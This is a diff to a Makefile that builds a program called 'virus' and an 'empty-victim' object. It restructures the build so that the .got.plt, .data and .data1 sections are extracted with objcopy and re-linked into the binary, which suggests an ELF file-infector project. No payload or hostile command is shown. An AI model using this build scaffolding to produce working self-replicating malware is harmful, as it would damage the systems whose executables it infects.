@@ -1,16 +1,42 @@
 CFLAGS += -std=gnu11 -Wall -Wextra -Werror -pedantic
+LDFLAGS += -Wl,--defsym,elf_headers=__executable_start \
+		   -Wl,--defsym,mutable_data_init_begin=_binary_data2_bin_start \
+		   -Wl,--defsym,mutable_data_init_end=_binary_data2_bin_end
 
-virus: virus.c compute-virus-info-32.c compute-virus-info-64.c
-	$(CC) $(CPPFLAGS) $(CFLAGS) -o $@ $< $(LDFLAGS)
+virus: data2.x virus.o empty-victim.o data2.o
+	$(CC) -T $< -o $@ virus.o empty-victim.o data2.o $(LDFLAGS)
 
-compute-virus-info-%.c: compute-virus-info.c
-	echo 'DEFINE_COMPUTE_VIRUS_INFO($*)' | cat $< - | $(CC) -E -x c -P -CC - > $@
+data2.o: data2.bin
+	objcopy --input-format=binary --output-format=elf64-x86-64 --binary-architecture=i386 --rename-section .data=.data2 $< $@
 
-compute-virus-info.c: compute-virus-info.template.c
-	sed 's,$$, /*\n*/\\,' < $< > $@
-	echo >> $@
+data2.bin: virus.got.plt virus.data virus.data1
+	cat $^ > $@
+
+virus.got.plt: virus.elf
+	objcopy --output-format=binary --only-section=.got.plt $< $@
+
+virus.data: virus.elf
+	objcopy --output-format=binary --only-section=.data $< $@
+
+virus.data1: virus.elf
+	objcopy --output-format=binary --only-section=.data1 $< $@
+
+virus.elf: LDFLAGS += -Wl,--defsym,_binary_data2_bin_start=0 \
+					  -Wl,--defsym,_binary_data2_bin_end=0
+virus.elf: common.x virus.o empty-victim.o
+	$(CC) -T $< -o $@ virus.o empty-victim.o $(LDFLAGS)
+
+data2.x: common.x
+
+virus.o: virus.c
+	$(CC) $(CPPFLAGS) $(CFLAGS) -c $<
+
+empty-victim.o: empty-victim.c
+	$(CC) $(CPPFLAGS) $(CFLAGS) -c $<
+
+virus.c empty-victim.c: victim.h
 
 clean:
-	$(RM) virus compute-virus-info-*.c compute-virus-info.c
+	$(RM) virus virus.elf virus.got.plt virus.data virus.data1 data2.bin *.o
 
 .PHONY: check clean
